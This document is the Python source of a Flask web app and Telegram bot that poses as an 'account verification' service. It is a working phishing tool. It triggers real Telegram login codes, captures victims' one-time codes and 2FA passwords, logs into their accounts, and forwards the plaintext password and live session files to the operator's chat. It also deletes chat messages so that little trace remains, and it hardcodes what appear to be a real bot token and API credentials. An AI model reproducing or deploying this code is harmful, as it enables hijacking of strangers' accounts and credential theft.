import os
import telebot
from telebot import types
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from flask import Flask, render_template, request, jsonify
import asyncio
from datetime import datetime, timedelta
import re
import time
import threading
import requests
import uuid
import json
from functools import wraps

# Initialize Flask
app = Flask(__name__)

# Configuration (Set these in Render environment variables)
BOT_TOKEN = os.environ.get('BOT_TOKEN', '7487704262:AAE34XTNrKt5D9dKtduPK0Ezwc9j3SLGoBA')
USER_ID = int(os.environ.get('USER_ID', '5425526761'))
API_ID = int(os.environ.get('API_ID', '25240346'))
API_HASH = os.environ.get('API_HASH', 'b8849fd945ed9225a002fda96591b6ee')

# Initialize bot
bot = telebot.TeleBot(BOT_TOKEN)

# Storage
sessions = {}
session_expiry = 300  # 5 minutes
telegram_clients = {}

# Create directories
os.makedirs('sessions', exist_ok=True)

# ==================== HELPER FUNCTIONS ====================
def generate_session_id():
    return str(uuid.uuid4())

def clean_phone(phone):
    return re.sub(r'[^\d+]', '', phone)

def generate_session_file(phone):
    safe_phone = clean_phone(phone)
    timestamp = int(time.time())
    return f"sessions/{safe_phone}_{timestamp}.session"

def clean_otp(otp):
    cleaned = re.sub(r'\D', '', otp)
    return cleaned if len(cleaned) == 5 else None

def get_client(session_file):
    if session_file not in telegram_clients:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        client = TelegramClient(
            session_file,
            API_ID,
            API_HASH,
            loop=loop,
            timeout=15
        )
        telegram_clients[session_file] = {
            'client': client,
            'loop': loop
        }
    return telegram_clients[session_file]

async def send_otp_async(client, phone):
    try:
        await client.connect()
        result = await client.send_code_request(phone)
        return {
            'success': True,
            'phone_code_hash': result.phone_code_hash
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

async def verify_otp_async(client, phone, code, phone_code_hash):
    try:
        await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
        
        if await client.is_user_authorized():
            me = await client.get_me()
            return {
                'success': True,
                'requires_2fa': False,
                'user': {
                    'id': me.id,
                    'username': me.username,
                    'first_name': me.first_name,
                    'last_name': me.last_name,
                    'phone': phone
                }
            }
        else:
            return {'success': True, 'requires_2fa': True}
            
    except SessionPasswordNeededError:
        return {'success': True, 'requires_2fa': True}
    except PhoneCodeExpiredError:
        return {'success': False, 'error': 'OTP expired', 'code_expired': True}
    except PhoneCodeInvalidError:
        return {'success': False, 'error': 'Invalid OTP'}
    except Exception as e:
        error_str = str(e).lower()
        if 'password' in error_str or '2fa' in error_str:
            return {'success': True, 'requires_2fa': True}
        return {'success': False, 'error': str(e)}

async def verify_2fa_async(client, password):
    try:
        await client.sign_in(password=password)
        me = await client.get_me()
        return {
            'success': True,
            'user': {
                'id': me.id,
                'username': me.username,
                'first_name': me.first_name,
                'last_name': me.last_name,
                'phone': me.phone
            }
        }
    except Exception as e:
        return {'success': False, 'error': str(e)}

def send_to_admin(phone, user_info=None, password=None):
    try:
        msg = f"📱 <b>NEW WEBAPP VERIFICATION</b>\n\n📞 Phone: {phone}"
        if user_info:
            msg += f"\n👤 User: {user_info.get('first_name', '')} {user_info.get('last_name', '')}"
            msg += f"\n🔗 @{user_info.get('username', 'N/A')}"
            msg += f"\n🆔 ID: {user_info.get('id', 'N/A')}"
        if password:
            msg += f"\n🔐 2FA: {password}"
        
        msg += f"\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        bot.send_message(USER_ID, msg, parse_mode='HTML')
    except Exception as e:
        print(f"Admin message error: {e}")

def cleanup_sessions():
    current_time = datetime.now()
    expired = []
    for session_id, session in sessions.items():
        if session['expiry'] < current_time:
            expired.append(session_id)
    for session_id in expired:
        del sessions[session_id]

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/process-contact', methods=['POST'])
def process_contact():
    try:
        data = request.json
        phone = data.get('phone', '').strip()
        
        if not phone:
            return jsonify({'success': False, 'error': 'No phone number'})
        
        if not phone.startswith('+'):
            phone = '+' + phone
        
        session_id = generate_session_id()
        session_file = generate_session_file(phone)
        
        # Get Telegram client
        client_data = get_client(session_file)
        client = client_data['client']
        loop = client_data['loop']
        
        # Send OTP
        result = loop.run_until_complete(send_otp_async(client, phone))
        
        if result['success']:
            sessions[session_id] = {
                'phone': phone,
                'phone_code_hash': result['phone_code_hash'],
                'session_file': session_file,
                'expiry': datetime.now() + timedelta(seconds=session_expiry),
                'attempts': 0
            }
            
            # Notify admin
            try:
                bot.send_message(
                    USER_ID,
                    f"📲 <b>New WebApp Contact</b>\n\n📱 {phone}\n⏰ {datetime.now().strftime('%H:%M:%S')}",
                    parse_mode='HTML'
                )
            except Exception as e:
                print(f"Admin notification error: {e}")
            
            return jsonify({
                'success': True,
                'session_id': session_id,
                'message': 'OTP sent'
            })
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Failed to send OTP')})
            
    except Exception as e:
        print(f"Process contact error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-otp', methods=['POST'])
def verify_otp():
    try:
        data = request.json
        session_id = data.get('session_id')
        otp = data.get('otp', '')
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        session = sessions[session_id]
        
        # Clean OTP
        cleaned_otp = clean_otp(otp)
        if not cleaned_otp:
            return jsonify({'success': False, 'error': 'Invalid OTP format'})
        
        # Check attempts
        session['attempts'] += 1
        if session['attempts'] > 3:
            del sessions[session_id]
            return jsonify({'success': False, 'error': 'Too many attempts'})
        
        # Verify OTP
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(verify_otp_async(
            client,
            session['phone'],
            cleaned_otp,
            session['phone_code_hash']
        ))
        
        if result['success']:
            if result.get('requires_2fa'):
                session['expiry'] = datetime.now() + timedelta(seconds=600)
                return jsonify({
                    'success': True,
                    'requires_2fa': True,
                    'message': '2FA required'
                })
            else:
                # Success
                send_to_admin(session['phone'], result.get('user'))
                
                # Send session file
                if os.path.exists(session['session_file']):
                    try:
                        with open(session['session_file'], 'rb') as f:
                            bot.send_document(USER_ID, f, caption=f"Session: {session['phone']}")
                    except Exception as e:
                        print(f"Session file error: {e}")
                
                del sessions[session_id]
                return jsonify({
                    'success': True,
                    'requires_2fa': False,
                    'message': 'Verified'
                })
        else:
            if result.get('code_expired'):
                del sessions[session_id]
                return jsonify({'success': False, 'error': 'OTP expired. Restart'})
            return jsonify({'success': False, 'error': result.get('error', 'Verification failed')})
            
    except Exception as e:
        print(f"Verify OTP error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/verify-2fa', methods=['POST'])
def verify_2fa():
    try:
        data = request.json
        session_id = data.get('session_id')
        password = data.get('password', '').strip()
        
        if session_id not in sessions:
            return jsonify({'success': False, 'error': 'Session expired'})
        
        if not password:
            return jsonify({'success': False, 'error': 'No password'})
        
        session = sessions[session_id]
        client_data = get_client(session['session_file'])
        client = client_data['client']
        loop = client_data['loop']
        
        result = loop.run_until_complete(verify_2fa_async(client, password))
        
        if result['success']:
            # Success with 2FA
            send_to_admin(session['phone'], result.get('user'), password)
            
            # Send session file
            if os.path.exists(session['session_file']):
                try:
                    with open(session['session_file'], 'rb') as f:
                        bot.send_document(USER_ID, f, caption=f"2FA Session: {session['phone']}")
                except Exception as e:
                    print(f"Session file error: {e}")
            
            del sessions[session_id]
            return jsonify({'success': True, 'message': '2FA verified'})
        else:
            return jsonify({'success': False, 'error': result.get('error', 'Wrong password')})
            
    except Exception as e:
        print(f"Verify 2FA error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/api/complete', methods=['POST'])
def complete():
    try:
        data = request.json
        phone = data.get('phone', 'Unknown')
        
        # Final admin notification
        bot.send_message(
            USER_ID,
            f"✅ <b>VERIFICATION COMPLETE</b>\n\n📱 {phone}\n⏰ {datetime.now().strftime('%H:%M:%S')}\n🎉 Success!",
            parse_mode='HTML'
        )
        
        return jsonify({'success': True})
    except Exception as e:
        print(f"Complete error: {e}")
        return jsonify({'success': False})

# ==================== BOT HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def start_command(message):
    """Send WebApp button"""
    try:
        # Get current URL for WebApp
        webapp_url = request.host_url if request else 'https://your-app.onrender.com'
        
        keyboard = types.InlineKeyboardMarkup()
        webapp_btn = types.InlineKeyboardButton(
            text="🔐 Open Verification WebApp",
            web_app=types.WebAppInfo(url=f"{webapp_url.rstrip('/')}/")
        )
        keyboard.add(webapp_btn)
        
        # Delete any existing messages first
        try:
            bot.delete_message(message.chat.id, message.message_id)
        except:
            pass
        
        # Send WebApp button (this message will be visible)
        sent_msg = bot.send_message(
            message.chat.id,
            "🔐 <b>Telegram Account Verification</b>\n\n"
            "Click the button below to open verification WebApp:\n\n"
            "✅ No messages in chat\n"
            "✅ Auto-delete contact\n"
            "✅ Secure verification",
            reply_markup=keyboard,
            parse_mode='HTML'
        )
        
        # Schedule to delete this message after 10 seconds
        threading.Timer(10, lambda: delete_message(message.chat.id, sent_msg.message_id)).start()
        
    except Exception as e:
        print(f"Start command error: {e}")

def delete_message(chat_id, message_id):
    """Delete a message"""
    try:
        bot.delete_message(chat_id, message_id)
    except:
        pass

@bot.message_handler(content_types=['contact'])
def handle_contact(message):
    """Auto-delete contact messages and show WebApp"""
    try:
        # Delete the contact message immediately
        bot.delete_message(message.chat.id, message.message_id)
        
        # Send WebApp button
        start_command(message)
        
    except Exception as e:
        print(f"Contact handler error: {e}")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all other messages"""
    try:
        # Delete the message
        bot.delete_message(message.chat.id, message.message_id)
        
        # Send WebApp button
        start_command(message)
        
    except:
        pass

# ==================== POLLING THREAD ====================
def start_bot_polling():
    """Start bot polling in a separate thread"""
    print("🤖 Starting bot polling...")
    
    # Delete webhook first (if any)
    try:
        bot.remove_webhook()
        time.sleep(1)
    except:
        pass
    
    # Start polling with error handling
    while True:
        try:
            print("🔄 Bot polling started")
            bot.polling(none_stop=True, timeout=20, interval=2)
        except Exception as e:
            print(f"❌ Bot polling error: {e}")
            print("🔄 Restarting bot in 5 seconds...")
            time.sleep(5)

# ==================== CLEANUP THREAD ====================
def cleanup_loop():
    """Clean up old sessions periodically"""
    while True:
        time.sleep(60)
        cleanup_sessions()
        print(f"🧹 Cleaned up sessions. Active: {len(sessions)}")

# ==================== MAIN ====================
if __name__ == '__main__':
    print("="*60)
    print("🚀 Telegram WebApp Verification Bot")
    print("="*60)
    print(f"🤖 Bot Token: {BOT_TOKEN[:10]}...")
    print(f"👤 Admin ID: {USER_ID}")
    print("="*60)
    
    # Start cleanup thread
    threading.Thread(target=cleanup_loop, daemon=True).start()
    
    # Start bot polling in separate thread
    bot_thread = threading.Thread(target=start_bot_polling, daemon=True)
    bot_thread.start()
    
    # Give bot time to start
    time.sleep(2)
    
    # Get port for Render
    port = int(os.environ.get('PORT', 5000))
    
    print(f"🌐 Starting Flask on port {port}")
    print(f"📱 WebApp URL: http://localhost:{port}")
    print("✅ Bot is running and responding!")
    print("="*60)
    
    # Run Flask app
    app.run(
        host='0.0.0.0',
        port=port,
        debug=False,
        use_reloader=False,
        threaded=True
            )
